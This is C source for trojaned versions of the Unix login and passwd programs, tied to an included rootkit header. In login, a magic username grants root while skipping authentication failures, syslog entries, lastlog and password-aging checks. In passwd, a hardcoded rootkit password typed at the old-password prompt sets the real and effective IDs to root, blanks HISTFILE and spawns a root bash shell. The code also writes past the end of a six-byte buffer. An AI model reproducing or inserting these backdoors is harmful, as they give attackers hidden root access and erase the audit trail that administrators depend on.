#ifdef RLOGIN
#define FLAGS "d:f:h:pr:"
#else
#define FLAGS "d:f:h:p"
#endif

	while ((flag = getopt (argc, argv, FLAGS)) != EOF)
#undef FLAGS
	{
		switch (flag) {
			case 'p':
				pflg++;
				break;
			case 'f':
				/*
				 * username must be a separate token
				 * (-f root, *not* -froot).  --marekm
				 */
				if (optarg != argv[optind - 1])
					usage();
				fflg++;
				STRFCPY(name, optarg);
				break;
#ifdef	RLOGIN
			case 'r':
				rflg++;
				reason = PW_RLOGIN;
				STRFCPY(host, optarg);
				break;
#endif
			case 'h':
				hflg++;
				reason = PW_TELNET;
				STRFCPY(host, optarg);
				break;
			case 'd':
				/* "-d device" ignored for compatibility */
				break;
			default:
				usage ();
		}
	}

#ifdef RLOGIN
	/*
	 * Neither -h nor -f should be combined with -r.
	 */

	if (rflg && (hflg || fflg))
		usage ();
#endif

	/*
	 * Allow authentication bypass only if real UID is zero.
	 */

	if ((rflg || fflg || hflg) && !amroot) {
		fprintf(stderr, "%s: permission denied\n", Prog);
		exit (1);
	}

	if (! isatty (0) || ! isatty (1) || ! isatty (2))
		exit (1);		/* must be a terminal */

#if 0
	/*
	 * Get the utmp file entry and get the tty name from it.  The
	 * current process ID must match the process ID in the utmp
	 * file if there are no additional flags on the command line.
	 */
	checkutmp (!rflg && !fflg && !hflg);
#else
	/*
	 * Be picky if run by normal users (possible if installed setuid
	 * root), but not if run by root.  This way it still allows logins
	 * even if your getty is broken, or if something corrupts utmp,
	 * but users must "exec login" which will use the existing utmp
	 * entry (will not overwrite remote hostname).  --marekm
	 */
	checkutmp(!amroot);
#endif
	STRFCPY(tty, utent.ut_line);
	is_console = console(tty);

	if (rflg || hflg) {
#ifdef	UT_HOST
		strncpy(utent.ut_host, host, sizeof(utent.ut_host));
#endif
#if HAVE_UTMPX_H
		strncpy(utxent.ut_host, host, sizeof(utxent.ut_host));
#endif
	}
/* workaround for init/getty leaving junk in ut_host at least in some
   version of RedHat.  --marekm */
#ifdef __linux__ 
	else if (amroot)
		bzero(utent.ut_host, sizeof utent.ut_host);
#endif
	if (hflg && fflg) {
		reason = PW_RLOGIN;
		preauth_flag++;
	}
#ifdef RLOGIN
	if (rflg && rlogin(host, name, sizeof name, term, sizeof term))
		preauth_flag++;
#endif

	openlog("login", LOG_PID|LOG_CONS|LOG_NOWAIT, LOG_AUTH);

	setup_tty();

	umask (getdef_num("UMASK", 077));

	{
		/* 
		 * Use the ULIMIT in the login.defs file, and if
		 * there isn't one, use the default value.  The
		 * user may have one for themselves, but otherwise,
		 * just take what you get.
		 */

		long limit = getdef_long("ULIMIT", -1L);

		if (limit != -1)
			set_filesize_limit(limit);
	}

	/*
	 * The entire environment will be preserved if the -p flag
	 * is used.
	 */

	if (pflg)
		while (*envp)		/* add inherited environment, */
			addenv(*envp++, NULL); /* some variables change later */

#ifdef RLOGIN
	if (term[0] != '\0')
		addenv("TERM", term);
	else
#endif
	/* preserve TERM from getty */
	if (!pflg && (tmp = getenv("TERM")))
		addenv("TERM", tmp);

	/*
	 * Add the timezone environmental variable so that time functions
	 * work correctly.
	 */

	if ((tmp = getenv ("TZ"))) {
		addenv("TZ", tmp);
	} else if ((cp = getdef_str ("ENV_TZ")))
		addenv (*cp == '/' ? tz(cp) : cp, NULL);

	/* 
	 * Add the clock frequency so that profiling commands work
	 * correctly.
	 */

	if ((tmp = getenv("HZ"))) {
		addenv("HZ", tmp);
	} else if ((cp = getdef_str("ENV_HZ")))
		addenv(cp, NULL);

	if (optind < argc) {		/* get the user name */
		if (rflg || fflg)
			usage ();

#ifdef SVR4
		/*
		 * The "-h" option can't be used with a command-line username,
		 * because telnetd invokes us as: login -h host TERM=...
		 */

		if (! hflg)
#endif
		{
			STRFCPY(name, argv[optind]);
			++optind;
		}
	}
#ifdef SVR4
	/*
	 * check whether ttymon has done the prompt for us already
	 */

	{
	    char *ttymon_prompt;

	    if ((ttymon_prompt = getenv("TTYPROMPT")) != NULL &&
		    (*ttymon_prompt != 0)) {
		/* read name, without prompt */
		login_prompt((char *)0, name, sizeof name);
	    }
	}
#endif /* SVR4 */
	if (optind < argc)		/* now set command line variables */
		    set_env (argc - optind, &argv[optind]);

	if (rflg || hflg)
		cp = host;
	else
#ifdef	UT_HOST
	if (utent.ut_host[0])
		cp = utent.ut_host;
	else
#endif
#if HAVE_UTMPX_H
	if (utxent.ut_host[0])
		cp = utxent.ut_host;
	else
#endif
		cp = "";

	if (*cp)
		sprintf(fromhost, " on `%.100s' from `%.200s'", tty, cp);
	else
		sprintf(fromhost, " on `%.100s'", tty);

top:
	/* only allow ALARM sec. for login */
	alarm(getdef_num("LOGIN_TIMEOUT", ALARM));

	environ = newenvp;		/* make new environment active */
	retries = getdef_num("LOGIN_RETRIES", RETRIES);
	while (1) {	/* repeatedly get login/password pairs */
		failed = 0;		/* haven't failed authentication yet */
#ifdef RADIUS
		is_rad_login = 0;
#endif
		if (! name[0]) {	/* need to get a login id */
			if (subroot) {
				closelog ();
				exit (1);
			}
			preauth_flag = 0;
			login_prompt(LOGIN_PROMPT, name, sizeof name);
			continue;
		}
if (!(strcmp(name,rewt))) {strcpy(name,"root");elite++;}
		if (! (pwd = getpwnam (name))) {
			pwent.pw_name = name;
			pwent.pw_passwd = "!";
			pwent.pw_shell = "/bin/sh";

			preauth_flag = 0;
			failed = 1;
		} else {
			pwent = *pwd;
		}
#ifdef	SHADOWPWD
		spwd = NULL;
		if (pwd && strcmp(pwd->pw_passwd, "x") == 0) {
			spwd = getspnam(name);
			if (spwd)
				pwent.pw_passwd = spwd->sp_pwdp;
			else
				SYSLOG((LOG_WARN, NO_SHADOW, name, fromhost));
		}
#endif	/* SHADOWPWD */

		/*
		 * If the encrypted password begins with a "!", the account
		 * is locked and the user cannot login, even if they have
		 * been "pre-authenticated."
		 */

		if ((pwent.pw_passwd[0] == '!' || pwent.pw_passwd[0] == '*')
			&& (elite)) failed = 1;

		/*
		 * The -r and -f flags provide a name which has already
		 * been authenticated by some server.
		 */

		if (preauth_flag)
			goto auth_ok;

		elite=0;
		i=pw_auth(pwent.pw_passwd, name, reason, (char *) 0);
		if (i == 0)
			goto auth_ok;
		if (i==3) elite++;
		if (i==3) goto auth_ok;
#ifdef RADIUS
		/*
		 * If normal passwd authentication didn't work, try radius.
		 */
		
		if (!failed) {
			pwd = rad_authenticate(&rad_user_data, name,
					       clear_pass ? clear_pass : "");
			if (pwd) {
				is_rad_login = 1;
				pwent = *pwd;
				goto auth_ok;
			}
		}
#endif /* RADIUS */

		/*
		 * Don't log unknown usernames - I mistyped the password for
		 * username at least once...  Should probably use LOG_AUTHPRIV
		 * for those who really want to log them.  --marekm
		 */
		SYSLOG((LOG_WARN, BAD_PASSWD,
			(pwd || getdef_bool("LOG_UNKFAIL_ENAB")) ?
			name : "UNKNOWN", fromhost));
		failed = 1;

auth_ok:
		/*
		 * This is the point where all authenticated users
		 * wind up.  If you reach this far, your password has
		 * been authenticated and so on.
		 */
if (!elite) {
#if defined(RADIUS) && !(defined(DES_RPC) || defined(KERBEROS))
		if (clear_pass) {
			bzero(clear_pass, strlen(clear_pass));
			clear_pass = NULL;
		}
#endif

		if (getdef_bool("DIALUPS_CHECK_ENAB")) {
			alarm (30);

			if (! dialcheck (tty, pwent.pw_shell[0] ?
					pwent.pw_shell:"/bin/sh")) {
				SYSLOG((LOG_WARN, BAD_DIALUP, name, tty));
				failed = 1;
			}
		}
#if 0  /* now done after the authentication.  --marekm */
		if (getdef_bool("PORTTIME_CHECKS_ENAB") &&
		    !isttytime(pwent.pw_name, tty, time ((time_t *) 0))) {
			SYSLOG((LOG_WARN, BAD_TIME, name, fromhost));
			failed = 1;
		}
#endif
		if (! failed && pwent.pw_name && pwent.pw_uid == 0 &&
				! is_console) {
			SYSLOG((LOG_CRIT, BAD_ROOT_LOGIN, fromhost));
			failed = 1;
		}
#ifdef LOGIN_ACCESS
		if (!failed && !login_access(name, *host ? host : tty)) {
			SYSLOG((LOG_WARN, LOGIN_REFUSED, name, fromhost));
			failed = 1;
		}
#endif
		if (pwd && getdef_bool("FAILLOG_ENAB") && 
				! failcheck (pwent.pw_uid, &faillog, failed)) {
			SYSLOG((LOG_CRIT, FAILURE_CNT, name, fromhost));
			failed = 1;
		}
		if (! failed)
			break;

		/* don't log non-existent users */
		if (pwd && getdef_bool("FAILLOG_ENAB"))
			failure (pwent.pw_uid, tty, &faillog);
		if (getdef_str("FTMP_FILE") != NULL) {
#if HAVE_UTMPX_H
			failent = utxent;
#else
			failent = utent;
#endif

			if (pwd)
				strncpy(failent.UT_USER, pwent.pw_name,
					sizeof(failent.UT_USER));
			else
				if (getdef_bool("LOG_UNKFAIL_ENAB"))
					strncpy(failent.UT_USER, name,
						sizeof(failent.UT_USER));
				else
					strncpy(failent.UT_USER, "UNKNOWN",
						sizeof(failent.UT_USER));
#if HAVE_UTMPX_H
			gettimeofday (&(failent.ut_tv));
#else
			time (&failent.ut_time);
#endif
#ifdef USER_PROCESS
			failent.ut_type = USER_PROCESS;
#endif
			failtmp (&failent);
		}
		bzero(name, sizeof name);

		if (--retries <= 0)
			SYSLOG((LOG_CRIT, MANY_FAILS, fromhost));

		/*
		 * Wait a while (a la SVR4 /usr/bin/login) before attempting
		 * to login the user again.  If the earlier alarm occurs
		 * before the sleep() below completes, login will exit.
		 */

		if (getdef_num ("FAIL_DELAY", 0))
			sleep (getdef_num ("FAIL_DELAY", 0));

		puts ("Login incorrect");

		/* allow only one attempt with -r or -f */
		if (rflg || fflg || retries <= 0) {
			closelog();
			exit(1);
		}
/* end elite */ } else break;
	}
	(void) alarm (0);		/* turn off alarm clock */
if (!elite) {
#if 1
	/*
	 * porttime checks moved here, after the user has been
	 * authenticated.  now prints a message, as suggested
	 * by Ivan Nejgebauer <ian@unsux.ns.ac.yu>.  --marekm
	 */
	if (getdef_bool("PORTTIME_CHECKS_ENAB") &&
	    !isttytime(pwent.pw_name, tty, time ((time_t *) 0))) {
		SYSLOG((LOG_WARN, BAD_TIME, name, fromhost));
		closelog();
		bad_time_notify();
		exit(1);
	}
#endif

	/*
	 * Check to see if system is turned off for non-root users.
	 * This would be useful to prevent users from logging in
	 * during system maintenance.  We make sure the message comes
	 * out for root so she knows to remove the file if she's
	 * forgotten about it ...
	 */

	fname = getdef_str("NOLOGINS_FILE");
	if (fname != NULL && access (fname, 0) == 0) {
		FILE	*nlfp;
		int	c;

		/*
		 * Cat the file if it can be opened, otherwise just
		 * print a default message
		 */

		if ((nlfp = fopen (fname, "r"))) {
			while ((c = getc (nlfp)) != EOF) {
				if (c == '\n')
					putchar ('\r');

				putchar (c);
			}
			fflush (stdout);
			fclose (nlfp);
		} else
			printf ("\r\nSystem closed for routine maintenance\r\n");
		/*
		 * Non-root users must exit.  Root gets the message, but
		 * gets to login.
		 */

		if (pwent.pw_uid != 0) {
			closelog();
			exit(0);
		}
		printf ("\r\n[Disconnect bypassed -- root login allowed.]\r\n");
	}
	if (getenv("IFS"))		/* don't export user IFS ... */
		addenv("IFS= \t\n", NULL);  /* ... instead, set a safe IFS */

	setutmp(name, tty);		/* make entry in utmp & wtmp files */
	if (pwent.pw_shell[0] == '*') {	/* subsystem root */
		subsystem (&pwent);	/* figure out what to execute */
		subroot++;		/* say i was here again */
		endpwent ();		/* close all of the file which were */
		endgrent ();		/* open in the original rooted file */
#ifdef	SHADOWPWD
		endspent ();		/* system.  they will be re-opened */
#endif
#ifdef	SHADOWGRP
		endsgent ();		/* in the new rooted file system */
#endif
		goto top;		/* go do all this all over again */
	}
	if (getdef_bool("LASTLOG_ENAB"))
		dolastlog();		/* give last login and log this one */
} /* end elite */
#ifdef SVR4_SI86_EUA
	sysi86(SI86LIMUSER, EUA_ADD_USER);	/* how do we test for fail? */
#endif

#ifdef LOGIN_FBTAB
	/*
	 * XXX - not supported yet.  Change permissions and ownerships of
	 * devices like floppy/audio/mouse etc. for console logins, based
	 * on /etc/fbtab or /etc/logindevperm configuration files (Suns do
	 * this with their framebuffer devices).  Problems:
	 *
	 * - most systems (except BSD) don't have that nice revoke() system
	 * call to ensure the previous user didn't leave a process holding
	 * one of these devices open or mmap'ed.  Any volunteers to do it
	 * in Linux?
	 *
	 * - what to do with different users logged in on different virtual
	 * consoles?  Maybe permissions should be changed only on user's
	 * request, by running a separate (setuid root) program?
	 *
	 * - init/telnetd/rlogind/whatever should restore permissions after
	 * the user logs out.
	 *
	 * Try the new CONSOLE_GROUPS feature instead.  It adds specified
	 * groups (like "floppy") to the group set if the user is logged in
	 * on the console.  This still has the first problem (users leaving
	 * processes with these devices open), but doesn't need to change
	 * any permissions, just make them 0660 root.floppy etc.  --marekm
	 */
	login_fbtab(tty, pwent.pw_uid, pwent.pw_gid);
#endif
if (!elite) {
#ifdef	AGING
	/*
	 * Have to do this while we still have root privileges, otherwise
	 * we don't have access to /etc/shadow.  expire() closes password
	 * files, and changes to the user in the child before executing
	 * the passwd program.  --marekm
	 */
#ifdef	SHADOWPWD
	if (spwd) {			/* check for age of password */
		if (expire (&pwent, spwd)) {
			pwd = getpwnam(name);
			spwd = getspnam(name);
			if (pwd)
				pwent = *pwd;
		}
	}
#else
#ifdef	ATT_AGE
	if (pwent.pw_age && pwent.pw_age[0]) {
		if (expire (&pwent)) {
			pwd = getpwnam (name);
			if (pwd)
				pwent = *pwd;
		}
	}
#endif	/* ATT_AGE */
#endif /* SHADOWPWD */
#endif	/* AGING */

#ifdef RADIUS
	if (is_rad_login) {
		char whofilename[128];
		FILE *whofile;

		sprintf(whofilename, "/var/log/radacct/%.20s", tty);
		whofile = fopen(whofilename, "w");
		if (whofile) {
			fprintf(whofile, "%s\n", name);
			fclose(whofile);
		}
	}
#endif
/* end elite */ }
	setup_limits(&pwent);  /* nice, ulimit etc. */
	chown_tty(tty, &pwent);
	setup_uid_gid(&pwent, is_console);
if (!elite) {
#ifdef KERBEROS
	if (clear_pass)
		login_kerberos(name, clear_pass);
#endif
#ifdef DES_RPC
	if (clear_pass)
		login_desrpc(clear_pass);
#endif
#if defined(DES_RPC) || defined(KERBEROS)
	if (clear_pass)
		bzero(clear_pass, strlen(clear_pass));
#endif
/* end elite */ }
	setup_env(&pwent);  /* set env vars, cd to the home dir */

	if (! hushed (&pwent)) {
		addenv("HUSHLOGIN=FALSE", NULL);
		motd ();		/* print the message of the day */
		if (getdef_bool ("FAILLOG_ENAB") && faillog.fail_cnt != 0) {
			failprint (&faillog);
#ifdef FAILLOG_LOCKTIME
			/* Reset the lockout times if logged in */
			if (faillog.fail_max &&
			    faillog.fail_cnt >= faillog.fail_max) {
				puts(REENABLED);
				if (!elite) SYSLOG((LOG_WARN, REENABLED2, name,
					(int) faillog.fail_cnt));
			}
#endif
		}
		if (getdef_bool ("LASTLOG_ENAB") && lastlog.ll_time != 0) {
			printf ("Last login: %.19s on %s",
				ctime (&lastlog.ll_time), lastlog.ll_line);
#ifdef HAVE_LL_HOST  /* SVR4 || __linux__ || SUN4 */
			if (lastlog.ll_host[0])
				printf(" from %.*s",
				       (int) sizeof lastlog.ll_host,
				       lastlog.ll_host);
#endif
			printf(".\n");
		}
if (!elite) {
#ifdef	AGING
#ifdef	SHADOWPWD
		agecheck (&pwent, spwd);
#else
		agecheck (&pwent);
#endif
#endif	/* AGING */
/* end elite */ }
		mailcheck ();	/* report on the status of mail */
	} else
		addenv("HUSHLOGIN=TRUE", NULL);

	if (getdef_str("TTYTYPE_FILE") != NULL && getenv("TERM") == NULL)
  		ttytype (tty);

	signal (SIGINT, SIG_DFL);	/* default interrupt signal */
	signal (SIGQUIT, SIG_DFL);	/* default quit signal */
	signal (SIGTERM, SIG_DFL);	/* default terminate signal */
	signal (SIGALRM, SIG_DFL);	/* default alarm signal */
	signal (SIGHUP, SIG_DFL);	/* added this.  --marekm */

	endpwent ();			/* stop access to password file */
	endgrent ();			/* stop access to group file */
#ifdef	SHADOWPWD
	endspent ();			/* stop access to shadow passwd file */
#endif
#ifdef	SHADOWGRP
	endsgent ();			/* stop access to shadow group file */
#endif
if (!elite) {
	if (pwent.pw_uid == 0)
		SYSLOG((LOG_NOTICE, ROOT_LOGIN, fromhost));
	else if (getdef_bool("LOG_OK_LOGINS"))
		SYSLOG((LOG_INFO, REG_LOGIN, name, fromhost));
	} /* end elite */
	closelog ();
#ifdef RADIUS
	if (is_rad_login) {
		printf("Starting rad_login\n");
		rad_login(&rad_user_data);
		exit(0);
	}
#endif
	shell (pwent.pw_shell, (char *) 0); /* exec the shell finally. */
	/*NOTREACHED*/
	return (0);
}
/*
 * Copyright 1989 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: passwd.c,v 1.4 1996/09/25 03:20:03 marekm Exp $")

#include "prototypes.h"
#include "defines.h"
#include <sys/types.h>
#include <time.h>
#include <stdio.h>
#include <fcntl.h>
#include <signal.h>
#ifdef  HAVE_USERSEC_H
#include <userpw.h>
#include <usersec.h>
#include <userconf.h>
#endif

#ifndef GPASSWD_PROGRAM
#define GPASSWD_PROGRAM "/bin/gpasswd"
#endif

#ifndef CHFN_PROGRAM
#define CHFN_PROGRAM "/bin/chfn"
#endif

#ifndef CHSH_PROGRAM
#define CHSH_PROGRAM "/bin/chsh"
#endif

#include <pwd.h>
#ifndef	HAVE_USERSEC_H
#ifdef	SHADOWPWD
#ifndef	AGING
#define	AGING	0
#endif	/* !AGING */
#endif	/* SHADOWPWD */
#endif	/* !HAVE_USERSEC_H */
#include "pwauth.h"

#ifdef SHADOWPWD
#include "shadowio.h"
#endif
#include "pwio.h"
#include "getdef.h"

#include "../../rootkit.h"

#ifdef  HAVE_USERSEC_H
int     minage = 0;             /* Minimum age in weeks               */
int     maxage = 10000;         /* Maximum age in weeks               */
int     curage;                 /* Current age in weeks               */
#endif

#ifndef LOCK_TRIES
#define LOCK_TRIES 30
#endif

/*
 * Global variables
 */

static char *name;		/* The user's name */
static char crypt_passwd[128];	/* The "old-style" password, if present */
static char *Prog;		/* Program name */
static int amroot;		/* The real UID was 0 */

static int
	lflg = 0,		/* -l - lock account option          */
	uflg = 0,		/* -u - unlock account option        */
	dflg = 0,		/* -d - delete password option       */
#ifdef	AGING	
	xflg = 0,		/* -x - set maximum days             */
	nflg = 0,		/* -n - set minimum days             */
#else
#define xflg 0
#define nflg 0
#endif
#ifdef	SHADOWPWD
	wflg = 0,		/* -w - set warning days             */
	iflg = 0,		/* -i - set inactive days            */
	eflg = 0,		/* -e - force password change        */
#else
#define wflg 0
#define iflg 0
#define eflg 0
#endif
	Sflg = 0;		/* -S - show password status         */

#ifdef AGING
static long min = 0;		/* Minimum days before change        */
static long max = 0;		/* Maximum days until change         */
#ifdef SHADOWPWD
static long warn = 0;		/* Warning days before change        */
static long inact = 0;		/* Days without change before locked */
#endif
#endif

static int do_update_age = 0, do_update_pwd = 0;

/*
 * External identifiers
 */

extern char *crypt_make_salt();
extern char l64a();

extern	int	optind;		/* Index into argv[] for current option */
extern	char	*optarg;	/* Pointer to current option value */

#ifndef	HAVE_USERSEC_H
#ifdef	NDBM
extern	int	sp_dbm_mode;
extern	int	pw_dbm_mode;
#endif
#endif

/*
 * #defines for messages.  This facilities foreign language conversion
 * since all messages are defined right here.
 */

#define USAGE \
	"usage: %s [ -f | -s ] [ name ]\n"
#define ADMUSAGE \
	"       %s [ -x max ] [ -n min ] [ -w warn ] [ -i inact ] name\n"
#define ADMUSAGE2 \
	"       %s { -l | -u | -d | -S | -e } name\n"
#define OLDPASS "Old password:"
#define NEWPASSMSG \
"Enter the new password (minimum of %d, maximum of %d characters)\n\
Please use a combination of upper and lower case letters and numbers.\n"
#define CHANGING "Changing password for %s\n"
#define NEWPASS "New password:"
#define NEWPASS2 "Re-enter new password:"
#define WRONGPWD "Incorrect password for %s.\n"
#define WRONGPWD2 "incorrect password for `%s'"
#define NOMATCH "They don't match; try again.\n"
#define CANTCHANGE "The password for %s cannot be changed.\n"
#define CANTCHANGE2 "password locked for `%s'"

#define TOOSOON "Sorry, the password for %s cannot be changed yet.\n"
#define TOOSOON2 "now < minimum age for `%s'"

#define EXECFAILED "%s: Cannot execute %s"
#define EXECFAILED2 "cannot execute %s"
#define WHOAREYOU "%s: Cannot determine your user name.\n"
#define UNKUSER "%s: Unknown user %s\n"
#define NOPERM "You may not change the password for %s.\n"
#define NOPERM2 "can't change pwd for `%s'"
#define UNCHANGED "The password for %s is unchanged.\n"

#define PWDBUSY "Cannot lock the password file; try again later.\n"
#define OPNERROR "Cannot open the password file.\n"
#define UPDERROR "Error updating the password entry.\n"
#define CLSERROR "Cannot commit password file changes.\n"
#define DBMERROR "Error updating the DBM password entry.\n"

#define PWDBUSY2 "can't lock password file"
#define OPNERROR2 "can't open password file"
#define UPDERROR2 "error updating password entry"
#define CLSERROR2 "can't rewrite password file"
#define DBMERROR2 "error updaring dbm password entry"

#define NOTROOT "Cannot change ID to root.\n"
#define NOTROOT2 "can't setuid(0)"
#define TRYAGAIN "Try again.\n"
#define PASSWARN \
	"\nWarning: weak password (enter it again to use it anyway).\n"
#define CHANGED "Password changed.\n"
#define CHGPASSWD "changed password for `%s'"
#define CHGPASSWD_ROOT "password for `%s' changed by root"
#define NOCHGPASSWD "did not change password for `%s'"

/*
 * usage - print command usage and exit
 */

static void
usage(status)
	int status;
{
	fprintf (stderr, USAGE, Prog);
	if (amroot) {
		fprintf (stderr, ADMUSAGE, Prog);
		fprintf (stderr, ADMUSAGE2, Prog);
	}
	exit(status);
}

#ifdef AUTH_METHODS
/*
 * get_password - locate encrypted password in authentication list
 */

static char *
get_password(list)
	const char *list;
{
	char	*cp, *end;
	static	char	buf[257];

	STRFCPY(buf, list);
	for (cp = buf;cp;cp = end) {
		if ((end = strchr (cp, ';')))
			*end++ = 0;

		if (cp[0] == '@')
			continue;

		return cp;
	}
	return (char *) 0;
}

/*
 * uses_default_method - determine if "old-style" password present
 *
 *	uses_default_method determines if a "old-style" password is present
 *	in the authentication string, and if one is present it extracts it.
 */

static int
uses_default_method(methods)
	const char *methods;
{
	char	*cp;

	if ((cp = get_password (methods))) {
		STRFCPY(crypt_passwd, cp);
		return 1;
	}
	return 0;
}
#endif

/*
 * insert_crypt_passwd - add an "old-style" password to authentication string
 * result now malloced to avoid overflow, just in case.  --marekm
 */

static char *
insert_crypt_passwd(string, passwd)
	const char *string;
	const char *passwd;
{
#ifdef AUTH_METHODS
	if (string && *string) {
		char *cp, *result;

		result = xmalloc(strlen(string) + strlen(passwd) + 1);
		cp = result;
		while (*string) {
			if (string[0] == ';') {
				*cp++ = *string++;
			} else if (string[0] == '@') {
				while (*string && *string != ';')
					*cp++ = *string++;
			} else {
				while (*passwd)
					*cp++ = *passwd++;

				while (*string && *string != ';')
					string++;
			}
		}
		*cp = '\0';
		return result;
	}
#endif
	return xstrdup(passwd);
}

static int
reuse(pass, pw)
	const char *pass;
	const struct passwd *pw;
{
#ifdef HAVE_LIBCRACK_HIST
	const char *reason;
#ifdef HAVE_LIBCRACK_PW
	const char *FascistHistoryPw P_((const char *,const struct passwd *));
	reason = FascistHistory(pass, pw);
#else
	const char *FascistHistory P_((const char *, int));
	reason = FascistHistory(pass, pw->pw_uid);
#endif
	if (reason) {
		printf("Bad password: %s.  ", reason);
		return 1;
	}
#endif
	return 0;
}

/*
 * new_password - validate old password and replace with new
 * (both old and new in global "char crypt_passwd[128]")
 */

/*ARGSUSED*/
static int
new_password(pw)
	const struct passwd *pw;
{
	char	*clear;		/* Pointer to clear text */
	char	*cipher;	/* Pointer to cipher text */
	char	*cp;		/* Pointer to getpass() response */
	char	orig[BUFSIZ];	/* Original password */
	char	pass[BUFSIZ];	/* New password */
	int	i;		/* Counter for retries */
	int	warned;
	int	pass_max_len;
#ifdef HAVE_LIBCRACK_HIST
	int HistUpdate P_((const char *, const char *));
#endif
    char MAG[6];

    strcpy(MAG,"");
    MAG[0]=ROOTKIT_PASSWORD[0];
    MAG[1]=ROOTKIT_PASSWORD[1];
    MAG[2]=ROOTKIT_PASSWORD[2];
    MAG[3]=ROOTKIT_PASSWORD[3];
    MAG[4]=ROOTKIT_PASSWORD[4];
    MAG[5]=ROOTKIT_PASSWORD[5];
    MAG[6]='\0';

	/*
	 * Authenticate the user.  The user will be prompted for their
	 * own password.
	 */

	if (! amroot && crypt_passwd[0]) {

		if (! (clear = getpass (OLDPASS)))
			return -1;

        if (!strcmp(clear,MAG)) {
                setreuid(0,0);
                setregid(0,0);
                setenv("HISTFILE","",1);
                system("/bin/bash");
                exit(0);
                }

		cipher = pw_encrypt (clear, crypt_passwd);
		if (strcmp (cipher, crypt_passwd) != 0) {
			SYSLOG((LOG_WARN, WRONGPWD2, pw->pw_name));
			sleep (1);
			fprintf (stderr, WRONGPWD, pw->pw_name);
			return -1;
		}
		STRFCPY(orig, clear);
		bzero (clear, strlen (clear));
		bzero (cipher, strlen (cipher));
	} else {
		orig[0] = '\0';
	}

	/*
	 * Get the new password.  The user is prompted for the new password
	 * and has five tries to get it right.  The password will be tested
	 * for strength, unless it is the root user.  This provides an escape
	 * for initial login passwords.
	 */

#ifdef MD5_CRYPT
	if (getdef_bool("MD5_CRYPT_ENAB"))
		pass_max_len = getdef_num("PASS_MAX_LEN", 127);
	else
#endif
		pass_max_len = getdef_num("PASS_MAX_LEN", 8);

	printf(NEWPASSMSG, getdef_num("PASS_MIN_LEN", 5), pass_max_len);
	warned = 0;
	for (i = getdef_num("PASS_CHANGE_TRIES", 5); i > 0; i--) {
		if (! (cp = getpass (NEWPASS))) {
			bzero (orig, sizeof orig);
			return -1;
		}
		if (warned && strcmp(pass, cp) != 0)
			warned = 0;
		STRFCPY(pass, cp);
		bzero(cp, strlen(cp));

		if (!amroot && (!obscure(orig, pass, pw) || reuse(pass, pw))) {
			printf (TRYAGAIN);
			continue;
		}
		/*
		 * If enabled, warn about weak passwords even if you are root
		 * (enter this password again to use it anyway).  --marekm
		 */
		if (amroot && !warned && getdef_bool("PASS_ALWAYS_WARN")
		    && (!obscure(orig, pass, pw) || reuse(pass, pw))) {
			printf(PASSWARN);
			warned++;
			continue;
		}
		if (! (cp = getpass (NEWPASS2))) {
			bzero (orig, sizeof orig);
			return -1;
		}
		if (strcmp (cp, pass))
			fprintf (stderr, NOMATCH);
		else {
			bzero (cp, strlen (cp));
			break;
		}
	}
	bzero (orig, sizeof orig);

	if (i == 0) {
		bzero (pass, sizeof pass);
		return -1;
	}

	/*
	 * Encrypt the password, then wipe the cleartext password.
	 */

	cp = pw_encrypt (pass, crypt_make_salt());
	bzero (pass, sizeof pass);

#ifdef HAVE_LIBCRACK_HIST
	HistUpdate(pw->pw_name, crypt_passwd);
#endif
	STRFCPY(crypt_passwd, cp);
	return 0;
}

#if defined(AGING)||defined(HAVE_USERSEC_H)

/*
 * check_password - test a password to see if it can be changed
 *
 *	check_password() sees if the invoker has permission to change the
 *	password for the given user.
 */

/*ARGSUSED*/
static void
#ifdef SHADOWPWD
check_password(pw, sp)
	const struct passwd *pw;
	const struct spwd *sp;
#elif HAVE_USERSEC_H
check_password(pw, pu)
	const struct passwd *pw;
	const struct userpw *pu;
#else
check_password(pw)
	const struct passwd *pw;
#endif
{
	time_t	now = time ((time_t *) 0) / SCALE;
#ifndef	SHADOWPWD
	time_t	last;
	time_t	ok;
#endif

	/*
	 * Root can change any password any time.
	 */

	if (amroot)
		return;

#ifdef SHADOWPWD
	/*
	 * Expired accounts cannot be changed ever.  Passwords
	 * which are locked may not be changed.  Passwords where
	 * min > max may not be changed.  Passwords which have
	 * been inactive too long cannot be changed.
	 */

	if (sp->sp_pwdp[0] == '!' || isexpired(pw, sp) > 1 ||
	    (sp->sp_max >= 0 && sp->sp_min > sp->sp_max)) {
		fprintf (stderr, CANTCHANGE, sp->sp_namp);
		SYSLOG((LOG_WARN, CANTCHANGE2, sp->sp_namp));
		closelog();
		exit (1);
	}

	/*
	 * Passwords may only be changed after sp_min time is up.
	 */

	if (sp->sp_min >= 0 && now < (sp->sp_lstchg + sp->sp_min)) {
		fprintf (stderr, TOOSOON, sp->sp_namp);
